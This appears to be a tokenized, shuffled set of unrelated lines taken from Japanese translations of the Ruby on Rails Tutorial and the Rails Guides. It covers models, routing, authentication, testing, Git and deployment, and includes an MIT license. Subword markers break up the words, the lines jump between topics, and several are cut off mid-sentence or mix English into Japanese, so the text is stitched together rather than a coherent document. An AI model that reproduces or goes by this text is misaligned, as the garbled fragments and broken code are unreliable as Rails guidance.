▁ コミット 時に 「 マージ すると Spring の プロセス ID ▁( p id ) ▁ ファイルが 上書き される 可能性があります 」 のような エラーメッセージ が表示される 場合は 、 コマンドラインで \ k ode { rm ▁- f ▁* ▖ p id } を実行して p id ファイルを 削除 してください 。
▁ いずれ の場合 も 、 名前付きルート ▁( name d ▁route ) は 、` scope ` を使用し なかった場合 と同じ である ことにご注目ください 。
▁Rails ▁4▖1 から は ` ActiveSupport :: Callbacks ▖ set _ callback ` の 呼び出し の 際に 明示的に ブロック を 渡す ことが 期 待 されます 。
▁ユーザーの データモデル
▁Micropost データモデル
▁上の例では 、` Client ` テーブル が 空 なら ` false ` を返し 、 それ以外の 場合は ` true ` を返します 。
▁> > ▁p ▖ save !
▁def ▁update
▁ パスワードの再設定 が 失敗した場合
▁ユーザーの リレーションシップ を削除し て フォロー解除 する 。
▁` delegate ` マクロ を使用すると 、 メソッド を簡単に 委譲 できます 。
▁ ターミナル で ` rake ▁routes ` コマンドを実行 しても 同じ 結果を 得られます 。
▁次に \ k ode { git ▁add ▁- A } を実行し 、 プロジェクト の ファイルを リポジトリ に追加します 。
▁ 都 合 の 良い ことに 、 今回 実装 する アカウント有効化 や パスワード再設定の 仕 組み と 、 以前 に 実装 した パスワード や 記憶トークン の 仕 組み には よく 似 た 点 が多い ので 、 多くの ア イ デ ア を使い 回 す ことができます ▁(\ k ode { User ▖ digest } メソッド 、\ k ode { User ▖ new \_ token } メソッド 、 改造 版 の \ k ode { user ▖ authenticated ?} メソッド など ) 。
▁ それ以外の アクション であれば 、 配列 の最初の 要素 に アクション 名を 挿入する だけで済みます 。
▁def ▁un de co ra ted _ table _ name ( class _ name ▁= ▁base _ class ▖ name )
▁Active ▁Record オブジェクトを ひ と た び 取得 すると 、 オブジェクトの 属性 を変更 して データベースに保存 できるようになります 。
▁Rails ▁3▖2 へのアップグレード では 必 須 ではありません が 、 今のうちに プラグイン を gem に エ ク ス ポート して Gemfile に追加する のが よいでしょう 。
▁\ k ode { picture } を 許可 された 属性 の リスト に追加する
▁config ▖ middleware ▖ delete ▁" ActionDispatch :: Session :: CookieStore "
▁#### ▁` humanize `
▁< option ▁value =" 2 "> D ▖ ▁ Thomas </ option >
▁| ▁1 ▁| ▁ SIMPLE ▁| ▁users ▁| ▁ const ▁| ▁PR IM A RY ▁|
▁validates _ with ▁G oodnessValidator , ▁fields : ▁ [: first _ name , ▁: last _ name ]
▁ 特定の 属性 のみ を更新し たい場合は 、 以下のように \ k ode { update \_ attribute } を使います ▟ なお 、 update \_ attribute には 検証 を 回 避 する といった 効果 もあります 。
▁ これを 避ける には 、 データベース の両方 の カラム に 一意 インデックス を作成する必要があります 。
▁この サンプルアプリケーション には 独自の ユーザーログイン が ないので 、 ユーザーを 一意 に 表 す 方法 も 考え なければならない でしょう 。
▁第 2 段 階 として 、 ▁ _ Web アプリケーション からの 出力 を も れ なく エスケープ する _ ▁ ことが 優 れ た 対策 となります ▟ これは 特に 、 ユーザー 入力 の 段階で フィルタ され なかった 文字列 が Web 画面 に 再 表示 されてしまう ようなことがあ った 場合に 有効 です 。
▁Ruby は 暗 黙 的に 関数 の 最後の 式 の値 を返す ので 、 ここでは \ text tt { foo } メソッドは \ text tt { boolean ?} の値 によって \ text tt {" bar "} または \ text tt {" baz "} を返します 。
▁ パスワード の長さ と \ k ode { authenticate } メソッド をテストする 。
▁次に 、 リスト \ ref { code : universal _ css } に示したように 、 Web サイト 全体 に わ た って レイアウト と 個 別の ページに スタイル を与える ための CSS を追加します 。
▁person ▁= ▁Person ▖ create ( name : ▁' H on d a ')
▁* ▁` collection ▖ destroy ( object , ▁ ▖▖▖)
▁ 事 実 上 、 すべての Web アプリケーションは 何らかの ログイン / 認証システムを 必要 とします 。
▁ 注意 : ▁この 名前 は 、 著者 の サンプルアプリケーション で 既に 使用 しています ので 、「 必ず 他の 名前 を使用してください 」 。
▁\ begin { equ ation }╼\ label { eq : de lt a _ p }╼\ D el t a ▁t _ r ▁= ▁t _ N ▁- ▁t _ r ╼\ end { equ ation }
▁以下の HTML が生成されます 。
▁ コンソール で 遊 んで み たい のであれば 、` rails ▁console ` で Rails アプリケーションを コンソール で 動 か せ ます 。
▁Rails ▁4 ▖ 2 から は 、\ text tt { by ebug } ▁gem を使って もっと 直接 的に デバッグ できるようになりました ▁( リスト \ ref { code : gemfile _ sample _ app }) 。
▁{0} 図 2▖ 7 {/0} ▁{1} ユーザー 編集 用の ページ ▁(\ href { http ://0▖0▖0▖0:3000/ users /1/ edit }{/ users /1/ edit }) {/1}
▁#### ▁ ス ペ ー サ ー テンプレート
▁ これを実現 するために 、 ユーザー ごとに 一意 かつ 安全 な 記憶トークン を生成し 、 ブラウザを閉じ ても 無効 にならない \ emph { 恒久 的な } cookies として 登録 します 。
▁ マイクロポストの ページネーション のテスト を追加 してください 。
▁scope ▁: published , ▁-> ▁ { ▁where ( published : ▁true ) ▁ }
▁` exclude ?` 述 語 は 、 与えられた オブジェクトが その コレクション に 属 して ▁** いない ** ▁ かどうか をテストします 。
▁create ▁app / models / blorgh / article ▖ rb
▁host : ▁ localhost
▁ では 、 次の 式 の値 は 何 です か ?
▁"2010-07-27 ▁23:42:00 "▖ to _ time (: utc ) ▁# ▁=> ▁Tue ▁Ju l ▁ 27 ▁23:42:00 ▁UTC ▁2010
▁ フレンドリーフォワーディング を備えた \ k ode { create } アクション
▁some _ code
▁unless ▁params [: token ] ▖ nil ?
▁Ruby における 基本的な オブジェクト の一部 は singleton オブジェクト です 。
▁ 新しい \ k ode { README } ファイル 「\ k ode { README ▖ md }」 の内容 。
▁< span >
▁この レイアウト は 、 コレクション 内の 各 項目 を レンダリング する たびに 一 緒 に レンダリング されます 。
▁ あるいは エディタ の [ File ] メニュー で ファイル を作成して 、 この ディレクトリ に保存 しても構いません 。
▁{0} 図 12 ▖ 8 {/0} ▁{1} Relationship データモデル {/1}
▁Rails コンソール を使用すると 、 コマンドライン から Rails アプリケーション と やりとり する ことができる 。
▁ この問題 を解決する には 、 それに対応する ` Article sController ` を作成 すればよいのです 。
▁リスト { p 0} で {2} log _ in {/2} という ヘルパーメソッド を 定義 できたので 、 や っ と 、 ユーザーログイン を行って セッション の {2} create {/2} アクションを 完了 し 、 ユーザーの プロフィール ページに リダイレクト する 準備ができました 。
▁上 に対応する 3 つの メソッド を持つ 、 モデルの 属性 の別名 ▁( alias ) ▁ を 一度 に 作成 することができます 。
▁Action ▁Dispatch er 内部 の コンポーネント の 多く は 、 Rack の ミドルウェア として 実装 されています 。
▁ 開発環境 は Rails プログラマ 一 人 ひ と り すべて 異なります ▟ 開発者 は 慣 れ て く る に従い 、 自分の 環境 を 徹 底 的に カスタマイズ する もの だ からです ▟ 開発環境 を 大 別 すると 、 テキストエディタ や コマンドライン を使う 環境 と 、 IDE ▁( 統合 開発環境 ) ▁ の 2 つ に分け られます 。
▁since ▁( in )
▁ ハッシュ化 された パスワード は 、\ emph { 暗号化 された パスワード } と よく 誤 解 され が ち です 。
▁ 最後の 例 で わかるように 、` const _ defined ?` メソッド と同様に 2 番目の 引数 はデフォルトで true になります 。
▁require _ dependency ( c )
▁ n _ edit _ action ▁( end ) ╼╼% ▁section ▁ activating _ the _ account ▁( end )╼╼ \ subsection { 有効化 のテスト と リファクタリング } ▁% ▁( fold )╼\ label { sec : activation _ test _ and _ refactoring }╼╼
▁リスト \ ref { code : password _ reset _ form } のとき
▁ 最後の 例 では 、 要素 の 追加 を 連 鎖 ▁( chain ) ▁ できる ことを 示 しました ▟ 他の 多くの 言語 の配列 と異なり 、 Ruby では 異なる 型 が 配列 の中で 共 存 できます ▁( 上の 場合は 整 数 と 文字列 ) 。
▁# ▁If ▁true , ▁the ▁base ▁class ▁of ▁ anonymous ▁controllers ▁will ▁be ▁inferred
▁ すなわち 、 前 者 は \ text tt { POST } リクエストを ▁Relationship s コントローラに 送信 して リレーションシップ を \ k ode { create } ▁( 作成 ) ▁ し 、 後者は \ text tt { DELETE } リクエストを送信し て リレーションシップ を \ k ode { destroy } ▁( 削除 ) ▁ する ということです
▁リスト \ ref { code : sessions _ resource } で定義した ルーティング の URL や アクション ▁( 表 \ ref { table : RESTful _ users }) ▁ は 、 ユーザー用の URL や アクション ▁( 表 \ ref { table : RESTful _ sessions }) ▁ と だいたい 似 ています 。
▁< strong > Comment : </ strong >
▁\ k ode { User } クラスにおける継承 。
▁上のコード には \ k ode { match : ▁: first } という 記 述 があります ▟ これは 、\ emph { どの } 削除リンク を クリック するか は 問 わ ないこと を Capybara に 伝 えます ▟ これにより Capybara は 、 最初に 見つけ た リンクを 単 に クリック するようになります 。
▁ た った 12 行 で ここ まで の 機能 が 実装 できた ことは 、( Rails の ) ▁ 注 目 に 値 する 点 で もあります 。
▁もし 体 系 化 された カ リ キ ュ ラ ム や イン スト ラ ク ター による フィードバック が 欲 し け れば 、 T ealeaf は 良い 選択 肢 となり 得 る でしょう 。
▁self を省略した 結果を リスト \ ref { code : admin _ factory } に示します 。
▁なお 、\ emph { Rails チュートリアル } では 、\ k ode { path } 書 式 を使用する 一般的な 規 約 に従い 、 リダイレクト の場合 のみ \ k ode { url } 書 式 を使用します 。
▁+ - --- +-------------+ - --- ------+-------+ --------------- +
▁ 従来 の 伝 統 的な HTML ス キャン による サニタイズ は 公式 に 非推奨 化 されました ▟ 現在 推 奨 される 方法は [ ` Rails ▁HTML サ ニ タ イ ザ ` ]( https :// github ▖ com / rails / rails - html - sanitizer ) です 。
▁< a ▁ href ="# " ▁on click =" paintIt ( this , ▁' # 00 99 00 ', ▁' # FFFFFF ') "> P aint ▁it ▁green </ a >
▁TIP : ▁Web サーバー を 停 止 するには 、 実行 されている ターミナル の ウィンドウ で Ctrl ▁+ ▁C キーを 押 します 。
▁ 実は 上のコード のまま では 、\ emph { リクエスト } の フラッシュメッセージ が 一度 表示される と 消え ずに 残 ってしまいます ▟ リスト \ ref { code : signup _ flash } で リダイレクト を使用した とき とは異なり 、 表示 した テンプレート を \ k ode { render } メソッドで 強制的に 再 レンダリング しても リクエスト と 見 な されない ため 、 リクエスト の メッセージ が 消え ません 。
▁#### ▁` javascript _ include _ tag ` を使用して JavaScript ファイル にリンクする
▁この \ k ode { user } という 名前 そのもの は まったく 重要 ではない ことに注意してください ▟ たとえば user を foobar に置き換え 、\ k ode {@ users ▖ each ▁do ▁| foobar | } と 書 いて から \ k ode { render ▁ foobar } と 呼び出し ても 問題 なく 動作します 。
▁$ ▁ ▖ / configure ▁&& ▁make ▁&& ▁ sudo ▁make ▁install
▁` mass _ assignment _ sanitizer ` 設定 を ` config / environments / test ▖ rb ` にも 追加 する必要があります 。
▁100 ▖ to _ s (: percentage )
▁\ k ode { full \_ title } ヘルパーは 、 ページ タイトル が 定義 されていない 場合は 基本 タイトル 「 Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App 」 を返し 、 定義されている 場合は 基本 タイトル に 縦 棒 と 追加 ページ タイトル を追加して 返します ▁( リスト \ ref { code : title _ helper })
▁$ ▁ cd ▁blog
▁ 条件
▁リスト \ ref { code : generate _ user _ model } の コマンドを実行 して User 用 テストの 原 型 が でき ている は ず なので 、 まずは その 中 身 から 見 ていきましょう ▁( リスト \ ref { code : default _ user _ test }) 。
▁\ emph { 注 } : ▁ 今後 Heroku で 何らかの 本番 アプリケーションを 運 用 する 予 定 がある なら 、\ ref { sec : professional _ grade _ deployment } の production 用 Web サーバー の設定 に 必ず 従って ください 。
▁ 53 ▖ ordinalize ▁# ▁=> ▁" 53 r d "
▁まずは Micropost リソース の 最も 本 質 的な 部分 を表現する Micropost モデル を作成する ところから始め ましょう 。
▁また 、 ユーザーを ア ン フォロー するとき も 構造 はほとんど 同じ で 、\ k ode { post } メソッドを \ k ode { delete } メソッド に置き換え て テスト します 。
▁ このような ときには ` content _ for ` を使用します ▟ これにより 、 その JavaScript コードを 特定の ページに だけ インクルード し 、 サイトの 他の 部分 で インクルード され ることのないように できます 。
▁" helpers / # { module _ path } _ helper "
▁@ part ▖ assemblies ▖ delete (@ assembly 1 )
▁# ▁ 元の プロセス メソッド への 参 照 を 保存
▁ テスト 環境 に 以下 を追加する ことで テストの パフォーマンス が 向上 します 。
▁Rails ヘルパーは 、 このように オプション の ハッシュ を 取ること が よく あり 、 これにより Rails のコード から 離 れ ること なく 任意の HTML オプションを 柔 軟 に追加する ことができます 。
▁` preview _ new _ comment _ url ` や ` preview _ new _ comment _ path ` ルーティングヘルパー も 同時に 作成されます 。
▁ プロフィール サイドバー ▁( リスト \ ref { code : user _ show _ microposts }) ▁ の ときと同様 、 リスト \ ref { code : user _ info } の ユーザー情報 にも 、 その ユーザーが 投 稿 した マイクロポストの 総 数 が表示され ていることに注目してください 。
▁さらに このコード では 、 関連付け によって 使用できる ようになった メソッドを い く つ も 利用 しています 。
▁ namespace ▁: admin ▁do
▁* ▁` save `
▁| ▁| ▁4 11 ▁| ▁: length _ require d ▁|
▁`: on ` オプション を省略 しても 同様 の member ルーティング が生成されます ▟ この場合 リソース id の値 の 取得 に ` params [: id ]` ではなく ` params [: photo _ id ]` を使用する 点 が異なります 。
▁続いて 、 算 出 された 時点 まで の 経 過 秒 数 を元に ` since ` メソッドを 呼び出し 、 時間 を 補 正 します 。
▁デフォルトは `: controller ` です 。
▁図 \ ref { fig : initial _ failed _ signin _ rails _3} に表示されている デバッグ情報 にご注目ください ▟\ ref { sec : signin _ form } の 終わり でも 簡単に触れ ましたが 、\ k ode { params } ハッシュ では 、 以下のように \ k ode { session } キー の下に メールアドレス と パスワード があります 。
▁* ▁` template _ engine ` は ビューの テンプレート エンジン ( ERB や H a m l など ) を指定します 。
▁display : ▁table ;
▁これは ` config ▖ force _ ssl ` を ` true ` に すると 有効 になります 。
▁< ▁最初の ひとつ を 除 く すべての コミット に対して ' squash ' を 選択 する ▁>
▁* ▁ サーバー側で Ajax を扱う 方法
▁url : ▁ sqlite 3 : NOT _ my _ database
▁\ emph { Rails ▁ チュートリアル } では 、 覚え ておく 必要のある Web 特有の 概念 をすべて カ バー している ので 、\ text tt { POST } や \ text tt { PATCH } の違い が 分 から なくても 今は 心 配 する必要はありません 。
▁Web フォーム に Ajax を採用する のは 今 や 当 たり 前に なり つ つ あるので 、 Rails でも Ajax を簡単に 実装 できる ようになっています 。
▁### ▁` acts _ like ?(
▁図 \ ref { fig : cloud 9 _ new _ workspace } に示したように 、「 rails - tutorial 」( 「 rails \_ tutorial 」 に \ emph { しない } よう ご注意ください ) ▁という ワークスペース 名を 入力 し 、[ P ri v ate ▁to ▁the ▁people ▁I ▁in v ite ] ▁ を 選択 し 、 Rails チュートリアル の アイコン ▁( Ruby ▁on ▁Rails の アイコン では \ emph { ありません }) ▁ を設定します 。
▁この メールアドレスを リスト \ ref { code : email _ format _ validation _ tests } の 無効な メールアドレス リスト に追加し 、 これによって テストが 失敗する ことを確認してください ▟ 次に 、 リスト \ ref { code : be tt er _ email _ regex } に示した もう少し 複雑な 正規表現 を使用して 、 この テストが パス するようにしてください 。
▁最後に 完全な クラス を作成して 、 この章 を 終わり に しましょう ▟ そこで 、 第 \ ref { cha : modeling _ users } 章 で使用する ▁\ k ode { User } ▁ クラスを 最初から 作成する ことにします 。
▁ ログイン 状態 ▁( ログイン している かどうか ) ▁ は 、 一時 セッション のユーザー ID か 、 永続的セッション の 一意 な 記憶トークン に 基 いた 現在のユーザー が存在し ている かどうか で 決定 されます 。
▁\ k ode { ▖ gem r c } に ri と rdoc 生成 を 抑 制 する コマンド を追加する 。
▁このコードは リスト \ ref { code : signin _ feature s } で使用されていました ▟ もうひとつ 、
▁# ▁ レシーバの クラス に 委譲 する
▁2 つ目の コマンド ▁(\ k ode { git ▁branch }) ▁ は 、 すべての ローカル ブランチ を 一覧 表示 します ▟ 「\ k ode { * }」 はその ブランチ が 現在 使用 中 であること を表し ます 。
▁ 最 近 の Web アプリケーションで よく 実行される ジョブ と い えば 、 リクエスト - レスポンス の サイクル の 外 で メールを送信 する ことでしょう ▟ これにより 、 ユーザーが 送信 を 待 つ 必要 が なくなります 。
▁3 行目 は 、 今後 の Git リリース での 前 方 互換性 のために 使用される オプション 設定 です 。
▁` root ` ルーティング は 、 ルーティング ファイルの 先 頭 に記述 してください ▟ root は 最も よく 使用される ルーティング であり 、 最初に マッチする 必要がある からです 。
▁### ▁ 文字列 だけで 表 された 条件
▁ 今後 使用する 計 画 のある すべての リンク の リスト を 、 URL と ルート ▁( route ) ▁ の マッピング と 共 に 表 \ ref { table : url _ m app ing } に示します 。
▁\ href { http ://0▖0▖0▖0:3000/ microposts / new }{/ microposts / new } ページ をブラウザで開き 、 新しいマイクロポスト の 情報を 入力 して マイクロポスト をいくつか 作成 してみましょう ▁({1}{2} 図 2▖1 2 {/2}{/1} ) 。
▁これ だけで 、 ユーザーを 取り出す ことができます 。
▁PostgreSQL データベース への 接続 と 内容 表示 には 、\ href { http :// in duction app ▖ com /}{ In duction } という ツール が 便利です 。
▁* ▁` config ▖ action _ mailer ▖ observers ` は 、 メールを 配信 したときに 通知 を受け る オ ブ ザ ー バー を指定します 。
▁この ルーティング にアクセスすると 、 デフォルトの Rails アプリケーションで ` public / index ▖ html ` に表示される の と同様 の詳細 情報 ( Rails や Ruby のバージョン など ) が表示されます 。
▁=> ▁[" user @ foo ▖
▁#### ▁capture
▁class _ name : ▁" User ",
▁さらに 、 ファイル名 の \ k ode { custom ▖ css ▖ scss } には \ k ode { ▖ css } という 拡張子 も 含 まれ ているので 、 この ファイルは CSS ファイル であること が示されています ▟ また 、\ k ode { ▖ scss } という 拡張子 も 含 まれ ているので 、 ▁この ファイルは Sass を 記 述 できる CSS ファイル ▁( Sass y ▁CSS : ▁S css ) ▁ であること も 示 されており 、 Asset ▁Pipeline は これを 見 て Sass を 処理 できるようにします
▁ テスト を作成し ている と 、 私たちは アプリケーションを さまざまな 側 面 から 設計 すること を 強 い られます ▟ これは テスト駆動開発 の 素晴らしい 副 次 的 効果 のひとつ です 。
▁<%= ▁javascript _ include _ tag ▁" main " ▁%>
▁\ label { fig : new _ readme } }╼\ end { figure }╼╼ ▁% ▁section ▁version _ control ▁( end )╼╼ ▁\ section { デプロイ する } ▁% ▁( fold )╼ ▁\ label { sec : deploying }╼╼
▁ 渡される 名前 は シンボル または 文字列 です 。
▁` get ` の 引数に ` 文字列 ` を 渡す 場合は ` コントローラ # アクション ` 形式 であること が 前 提 ですが 、` get ` の 引数に ` シンボル ` を渡すと アクションに 直接 割り当て られます 。
▁Active ▁Support は ` Range # to _ s ` メソッドを 拡張 して フォーマット 引数 を オプションで 受け付け る ようにしています 。
▁ユーザーの index ビュー 。
▁Active ▁Record を使用して 、 モデル が データベースに 書き 込 まれ る 前に モデル の状態 を検証する ことができます 。
▁ umerate }╼╼ ▁% ▁subsection ▁login _ form ▁( end )╼╼ ▁\ subsection { ユーザーの 検索 と 認 証 } ▁% ▁( fold )╼ ▁\ label { sec : find ing _ and _ authenticating _ a _ user }╼╼
▁" table s "▖ singularize ▁# ▁=> ▁" table "
▁` deep _ dup ` メソッドは 、 与えられた オブジェクトの 「 デ ィ ー プ コピー 」 を返します 。
▁ユーザー 表示 用の ページ ▁(\ href { http :// localhost :3000/ users /1}{/ users /1 })
▁Rails では 、 Web リクエスト は Action ▁Pack で 取り 扱 われます ▟ この動作 は コントローラ 寄 り の 部分 ▁( ロ ジ ッ ク の実行 ) ▁ と ビュー 寄 り の 部分 ( テンプレート の 描画 ) ▁ に 分 か れ ます 。
▁module ▁ Z
▁これらの 章では 、\ k ode { has _ many } や \ k ode { has _ many ▁through } を使用した データモデル など 、 Rails の 最も 強力な 機能を い く つ も 紹介します 。
▁# ▁no ▁regular ▁words ▁or ▁you ' ll ▁be ▁expose d ▁to ▁ dictionary ▁attacks ▖
▁ リポジトリを プッシュ するときに 「 A re ▁you ▁sure ▁you ▁want ▁to ▁con t in ue ▁ connect ing ▁( y es / no ) ? 」 と 表示され たら y es と 入力 します 。
▁* ▁ スキーマ の 更新
▁Rails は自動的に 関連付けの プロキシ オブジェクトを ビルド します が 、 開発者 は これを カスタマイズ することができます 。
▁ これはリスト \ ref { code : micropost _ ordering } で使用されていました 。
▁{0} 図 7 ▖6{/0}{1} Users リソース 追加 後 の \ href { http :// localhost :3000/ users /1}{/ users /1 } の ユーザー表示ページ ▟ ▁\ href { http :// railstutorial ▖ org / images / figures / user _ show _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁### ▁ 動的な セグメント
▁# ▁この ブロック は ト ラン ザ ク ション 内で 呼び出される
▁<%= ▁link _ to ▁" New ▁Article ", ▁new _ article _ path ▁%>
▁ 特に 、\ emph { Active ▁Record } という Ruby ライブラリ のおかげで 、 リスト \ ref { code : demo _ user _ model } の User モデル は \ k ode { User ▖ all } という リクエスト に対して 、 D B 上の すべての ユーザー を返す ことができます 。
▁Rails の 慣例 では 、 その モデル を指す 外部キー を保持し ている 結合テーブル 上の カラム名 については 、 その モデル名 に サ フ ィ ッ ク ス ▁` _ id ` ▁ を追加した 名前 が 使用される ことを 前提と します 。
▁| ▁db / migrate / 20 140 1 20 20 10 10 _ create _ comments ▖ rb ▁| ▁ データベースに コメント 用の テーブル を作成するための マイグレーション ファイル ▁( ファイル名 の タイムスタンプ は これ とは異なり ます ) ▁|
▁ フィクスチャ のユーザー にアクセス できる ようになった ので 、 レイアウト の リンクを テスト できる 状態 になりました ▟ レイアウト のリンク をテストする には 、 前述の 操作 手順を テストコード に 書き 換 えます ▁( リスト \ ref { code : user _ login _ test _ valid _ information }) 。
▁User モデルと Micropost モデル をそれぞれ リスト \ ref { code : demo _ user _ has _ many _ microposts } と リスト \ ref { code : demo _ micropost _ belongs _ to _ user } のように 更新 することで この 関連付けを 表現 できます 。
▁` sum ` メソッドは enumerable の 要素を 合 計 します 。
▁ 数値 を 米国 式 の 電 話 番号 に変換 します 。
▁Rails の 一般的な 慣習 に 倣 って 、\ k ode { : success } という キー には 成功 時の メッセージ を 代入 する ようにします ▁( リスト \ ref { code : signup _ flash }) 。
▁ コントローラで ` cache s _ action ` を使用したい場合 は ` actionpack - action _ caching ` ▁gem を 、` cache s _ pages ` を使用したい場合 は ` actionpack - page _ caching ` ▁gem をそれぞれ Gemfile に追加する 必要があります 。
▁ 謝 辞
▁ ブラウザ によって は 、 「\ href { http :// stack overflow ▖ com / questions / 20 44 9 64 1 / rails - 4 - session - value - never - expire s - or - d ies - when - browser - close s } { ログイン 状態 を保存する }」 など で セッションを 自動 復 元 する 機能 が サポート されている ことがあります ▟ この 機能 は 開発 の 邪 魔 になるので 、 ログアウト する 前に この 機能を 必ず オフ に しておいてください 。
▁ スコープ で 引数 を使用する のであれば 、 クラスメソッド として 定義 する 方が 推 奨 されます 。
▁ 今回は User モデル を作成 したときに
▁リスト \ ref { code : static _ page _ routes } で ルート を定義し た ことにより 、 レイアウト の中で 名前付きルート が 使える ようになりました 。
▁id ▁1 の ユーザーが id ▁2 、 7 、 8 、 10 を フォローしている ときの フィード
▁ delegate ▁: size , ▁to : ▁: attachment , ▁prefix : ▁: avatar
▁ 代 わ って 、` / photos / R R 27 ` のような パス に マッチする ようになります 。
▁( こういった 正しい 振る舞い という のは 一般に 忘れ が ち ですが 、 受 け 入 れ テスト ▁( も しく は 一般的な テスト駆動開発 ) ▁ では 先に テストを書く ので 、 効果 的な ユーザー 体 験 について 考え る ようになります ▟)
▁* ▁` env [" rack ▖ multi th read "] ` を ` false ` に設定し 、 アプリケーションを M ute x で 包 みます 。
▁Rails では Web アプリケーションの 構成 に MVC ▁( Model - View - Controller ) ▁という モデル を採用し ている 。
▁The ▁ MIT ▁L ic en se ╼╼ Copy right ▁( c ) ▁2014 ▁ Michael ▁Hartl ╼╼ Permission ▁is ▁here by ▁gra nt ed , ▁free ▁of ▁charg e , ▁to ▁any ▁person ▁obtain ing ▁a ▁copy ╼ of ▁this ▁software ▁and ▁ associated ▁documentation ▁files ▁( the ▁" Software ") , ▁to ▁deal ╼ in ▁the ▁ Software ▁without ▁restrict ion , ▁including ▁without ▁ limit ation ▁the ▁right s ╼ to ▁use , ▁copy , ▁modify , ▁merge , ▁ publish , ▁distribute , ▁sub license , ▁and / or ▁ se ll ╼ co p ies ▁of ▁the ▁ Software , ▁and ▁to ▁ permit ▁person s ▁to ▁who m ▁the ▁ Software ▁is ╼ f ur n is h ed ▁to ▁do ▁so , ▁subject ▁to ▁the ▁following ▁conditions : ╼╼ The ▁above ▁copy right ▁notice ▁and ▁this ▁ permission ▁notice ▁shall ▁be ▁included ▁in ╼ all ▁copie s ▁or ▁substan tial ▁ port ion s ▁of ▁the ▁ Software ▖
▁Rails で 起動 される Web サーバー は 、 Ruby に デフォルトで 付 属 している WEBrick です 。
▁\ href { http :// www ▖ railstutorial ▖ org / ruby - on - rails - tutorial - book }{\ emph { Ruby ▁on ▁Rails チュートリアル } } へ よう こ そ 。
▁Rails には [ SQLite 3 ]( http :// www ▖ sqlite ▖ org ) の サポート が ビルトイン されています ▟ SQLite は 軽 量 かつ 専 用 サーバー の 不要な データベース アプリケーション です 。
▁このコードは リスト \ ref { code : user _ pages _ spec } で使用されていました ▟ もうひとつ 、
▁ 幸 運 には 、 ユーザー 用 fixture ファイルの \ k ode { password \_ digest } 属性 で 使 った ように 、 fixture では 埋め込み Ruby をサポートしてい ます ▟ これ を利用して さらに 30 人のユーザー を追加 してみましょう ▁( リスト \ ref { code : users _ fixtures _ extra _ users }) 。
▁> > ▁Rails ▖ env
▁ ユーザー編集ページ に対応する ビューを 、 リスト \ ref { code : user _ edit _ view } に示します ▁( この ファイルは 手動で 作成 する必要があります ) 。
▁また 、\ k ode { T ext } 型の 方が 将来 における 柔 軟 性 に 富 んで いて 、 たとえば い つ か 国 際 化 を するときに 、 言語 に応じて 投 稿 の長さ を 調 節 することもできます 。
▁リスト \ ref { code : users _ resource } のコード を使用することで 、 ルーティング が 有効 になります ▟ ただし 、 ルーティング 先 の ページ はまだ ありません ▁( 図 \ ref { fig : user _ show _ unknown _ action }) 。
▁ ex port ▖ add _ invoices ( invoices )
▁ po ol は ` ENV [' DAT A BASE _ URL ']` で 提供され る 情報 に 含まれていない ので 、 マージ されています 。
▁これは 、\ k ode { User ▖ new } を実行して も 単 に Ruby オブジェクトを メモリ 上に 作成する だけで 、 データベースに は アクセス しない ためです 。
▁ ユーザーは 他のユーザーをフォロー できる だけで なく 、 フォロー解除 も できる 必要があります ▟ O f ▁course , ▁users ▁should ▁be ▁able ▁to ▁ unfollow ▁other ▁users ▁as ▁well ▁as ▁follow ▁them , ▁which ▁lead s ▁to ▁the ▁some what ▁pre d ic table ▁\ k ode { unfollow !}
▁この節では 、 アプリケーションを ディレクトリ の 下 で 実行 する方法 について説明します 。
▁validates ▁: name , ▁presence : ▁ { ▁ strict : ▁true ▁ }
▁2 - 5 の 手順を 繰り返す 。
▁\ k ode { authenticate } メソッドが 使えるように なる ▁( 引数 の 文字列 が パスワード と 一致する と User オブジェクトを 、 間 違 っている と \ k ode { false } 返す メソッド )╼ 。
▁` Client ` モデルに ` locked ` という フィールド があれば 、` find _ by _ locked ` という メソッド を使用できます 。
▁Rails ▁ コンソール は 、 セッション ごとに ローカル の Rails 環境 を 読み込む ので 、 コンソール 内で 明示的に コントローラ を作成 したり 、 その クラス 階層 を調べ たり することができます
▁ 解決策 は 簡 単 で 、 ▁ { p 0} で開発した {2} log _ in _ as {/2} ヘルパー ▁( リスト \ ref { code : test _ helper _ log _ in }) ▁ を使う ことです ▟ 修正 した結果 を リスト \ ref { code : edit _ tests _ logged _ in } に示します 。
▁### ▁` has _ one ` 関連付け の詳細
▁ Connection : ▁ K eep - A li ve
▁ LE F T ▁ OUT ER ▁JOIN ▁orders ▁ ON ▁orders ▖ client _ id ▁= ▁client ▖ id ▁WHERE
▁ ╼\ end { enumerate }╼╼ ▁% ▁subsection ▁ friendly _ forwarding ▁( end )╼╼ ▁% ▁section ▁protect ing _ pages ▁( end )╼╼ ▁\ section { すべての ユーザー を表示する } ▁% ▁( fold )╼ ▁\ label { sec : showing _ all _ users }╼╼
▁最初の ステップ でも Capybara が使用されています が 、 その 次の ステップ では Capybara の \ k ode { page } オブジェクト と RSpec が 併 用 されています ▟ 見 て のとおり 、 RSpec と Capybara で 行える テストは 、 すべて Cucumber でも 行えます 。
▁Microposts リソース の 説明 が 終わり ました ので 、 ここで リポジトリを Bitbucket に 登録 しましょう 。
▁上の ガイドライン に従う 場合 、 現 実に は 最初に コントローラ や モデルの テストを 書き 、 続いて 統合テスト ▁( モデル / ビュー / コントローラに また が る 機能 テスト ) ▁ を書く 、 という ことになります 。
▁` first ` メソッドは 、 モデルに レコードが 1 つ も ない場合 に ` nil ` を返します ▟ このとき 例外 は 発生 しません 。
▁# ▁=> ▁Fri , ▁ 15 ▁Oct ▁ 1582 ▁00:00:00 ▁+0000
▁ ほぼ すべての Rails アプリケーションは 、 何らかの 形で データベース にアクセス します 。
▁def ▁ initialize ( person )
▁" ruby "▖ pluralize ▁# ▁=> ▁" rubi es "
▁╼╼ ▁\ section { 構造 を追加する } ▁% ▁( fold )╼ ▁\ label { sec : structure }╼╼
▁* ▁` テーブル名 _ count ` ▁- ▁ 関連付け において 、 所 属 している オブジェクトの 数を キャッシュ するのに 使用されます 。
▁user ▖ update ( name : ▁' Dave ')
▁また 、 メイラー のテスト 方法 についても 説明します 。
▁ この後 すぐ 、 プロファイル にも 統 計 情報 パーシャル を表示します が 、 今のうちに リスト \ ref { code : follow _ form _ partial } のように フォロー / フォロー解除 ボタン 用の パーシャル も 作成 しましょう 。
